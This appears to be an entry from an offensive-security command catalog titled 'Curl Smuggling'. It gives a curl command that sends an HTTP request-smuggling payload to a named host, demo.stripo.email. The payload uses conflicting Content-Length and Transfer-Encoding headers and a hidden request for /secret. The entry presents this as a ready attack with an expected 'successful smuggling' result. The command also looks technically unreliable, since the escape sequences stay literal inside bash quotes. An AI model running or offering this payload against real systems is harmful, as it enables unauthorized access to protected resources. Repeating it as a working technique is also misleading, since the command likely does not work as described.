---
id: cmd-002
data: >-
  curl -v --data "POST / HTTP/1.1\r\nHost: demo.stripo.email\r\nContent-Length:
  4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /secret HTTP/1.1\r\nHost:
  demo.stripo.email\r\n\r\n" https://demo.stripo.email
tags:
  - http
  - smuggling
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T09:01:21.510Z'
verified: false
validated: true
submitted: true
---
# Curl Smuggling

## Command

```bash
curl -v --data "POST / HTTP/1.1\r\nHost: demo.stripo.email\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /secret HTTP/1.1\r\nHost: demo.stripo.email\r\n\r\n" https://demo.stripo.email
```

## Description

Sends a crafted request to smuggle additional HTTP content.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose | No |
| `--data` | Raw data | Yes |

## Examples

### Basic Usage

```bash
curl -v --data "smuggling payload" https://target
```

## Expected Output

Server response indicating successful smuggling.

## Related

- [[commands/curl-http-probe]]
- [[procedures/Craft-Smuggling-Request]]
